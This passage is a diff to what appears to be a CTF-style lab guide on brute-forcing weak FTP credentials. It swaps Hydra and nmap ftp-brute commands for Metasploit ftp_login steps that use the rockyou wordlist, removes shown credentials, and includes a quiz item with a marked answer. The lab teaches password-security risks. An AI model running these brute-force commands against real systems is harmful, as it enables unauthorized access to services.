@@ -69,7 +69,7 @@ get flag.txt
 **Objective**: Brute-force weak FTP login credentials and access protected content.
 
 ### ✅ Learning Objectives
-- Use Hydra to brute-force login
+- Use msfconsole to brute-force login
 - Understand risk of weak passwords
 - Interact with FTP service securely
 - Download captured flag
@@ -106,23 +106,15 @@ get flag.txt
    - C. get flag.txt ✅
    - D. login root
 
-### 🔍 Scanning Instructions
-
 ```bash
-nmap -p 21 --script ftp-brute <target-ip>
-hydra -l ftpuser -P /usr/share/wordlists/rockyou.txt ftp://<target-ip>
+msfconsole
+Then in the console:
+use auxiliary/scanner/ftp/ftp_login
+set RHOSTS <target-ip>
+set USERNAME ftpuser
+set PASS_FILE /usr/share/wordlists/rockyou.txt
+run
 ```
-
-### 💥 Exploitation Steps
-
-```bash
-ftp <target-ip>
-# Credentials: ftpuser / 12345
-cd upload
-get flag.txt
-```
-
----
 
 ## 📁 Lab 3: Telnet Default Password
 
